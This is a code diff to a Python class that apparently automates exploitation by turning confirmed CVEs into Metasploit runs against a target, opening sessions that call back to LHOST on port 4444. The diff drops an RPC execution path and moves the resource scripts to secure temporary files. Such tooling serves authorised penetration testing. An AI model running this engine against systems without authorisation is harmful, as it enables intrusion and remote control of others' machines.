@@ -167,7 +167,6 @@ class CVE2MSFEngine(BaseEngine):
         ports: list[dict[str, Any]] = kwargs.get("ports", [])
         lhost: str = kwargs.get("lhost", self._detect_lhost())
         lport: int = int(kwargs.get("lport", 4444))
-        msf_client = kwargs.get("msf_client", None)
         raw_lines: list[str] = []
         engine_findings: list[dict[str, Any]] = []
 
@@ -189,8 +188,7 @@ class CVE2MSFEngine(BaseEngine):
         port_map = self._build_port_map(ports, findings)
         raw_lines.append(f"[INFO] Processing {len(confirmed_cves)} confirmed CVEs")
         raw_lines.append(f"[INFO] LHOST={lhost} LPORT={lport}")
-        rpc_available = msf_client is not None
-        raw_lines.append(f"[INFO] RPC mode: {'ENABLED' if rpc_available else 'DISABLED (fallback subprocess)'}")
+        raw_lines.append("[INFO] Metasploit via msfconsole subprocess")
 
         for cve in confirmed_cves:
             cve_upper = cve.upper().strip()
@@ -218,7 +216,6 @@ class CVE2MSFEngine(BaseEngine):
                 lhost=lhost,
                 lport=lport,
                 payload=module_info.get("payload", ""),
-                msf_client=msf_client,
                 raw_lines=raw_lines,
             )
 
@@ -268,29 +265,20 @@ class CVE2MSFEngine(BaseEngine):
         self,
         cve: str, module: str, target: str, port: int,
         lhost: str, lport: int, payload: str,
-        msf_client: Any, raw_lines: list[str],
+        raw_lines: list[str],
     ) -> dict[str, Any]:
-        if msf_client is not None:
-            try:
-                raw_lines.append(f"[RPC] Executing {module} via msfrpcd...")
-                result = msf_client.execute_module(
-                    module=module, rhosts=target, rport=port,
-                    payload=payload, lhost=lhost, lport=lport,
-                    timeout=120,
-                )
-                raw_lines.append(f"[RPC] Source: {result.get('source', 'rpc')}")
-                if result.get("session_id"):
-                    raw_lines.append(f"[RPC] Session #{result['session_id']} opened")
-                return result
-            except Exception as e:
-                raw_lines.append(f"[RPC] Error: {e}, falling back to subprocess")
-
         raw_lines.append(f"[MSF] Executing {module} via msfconsole subprocess...")
         rc_path = self._generate_rc_script(
             cve=cve, module=module, target=target, port=port,
             lhost=lhost, lport=lport, payload=payload,
         )
-        msf_output, session_id = self._run_msfconsole(rc_path, raw_lines)
+        try:
+            msf_output, session_id = self._run_msfconsole(rc_path, raw_lines)
+        finally:
+            try:
+                os.unlink(rc_path)
+            except OSError:
+                pass
         return {
             "success": session_id is not None,
             "session_id": session_id,
@@ -359,10 +347,9 @@ class CVE2MSFEngine(BaseEngine):
         ])
         rc_content = "\n".join(lines)
 
-        rc_dir = "/tmp/cve2msf"
-        os.makedirs(rc_dir, exist_ok=True)
-        safe_cve = cve.replace("/", "_").replace(" ", "_")
-        rc_path = os.path.join(rc_dir, f"{safe_cve}.rc")
+        import tempfile
+        fd, rc_path = tempfile.mkstemp(suffix=".rc", prefix=f"cve2msf_")
+        os.close(fd)
         with open(rc_path, "w") as f:
             f.write(rc_content)
         return rc_path
